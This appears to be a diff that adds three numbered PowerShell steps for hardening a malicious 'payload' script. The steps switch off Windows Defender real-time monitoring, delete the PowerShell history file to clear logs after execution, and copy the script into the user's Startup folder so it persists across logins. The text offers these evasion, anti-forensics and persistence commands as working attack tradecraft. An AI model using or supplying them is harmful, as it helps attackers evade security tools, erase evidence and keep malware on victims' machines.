@@ -1,0 +1,5 @@
+1. Disable Windows Defender : Set-MpPreference -DisableRealtimeMonitoring $true
+
+2. Clear logs after execution : Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
+
+3.Add this line before the final exit to make the payload truly persistent : "Copy-Item $PSCommandPath -Destination '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\payload.ps1' -Force;"
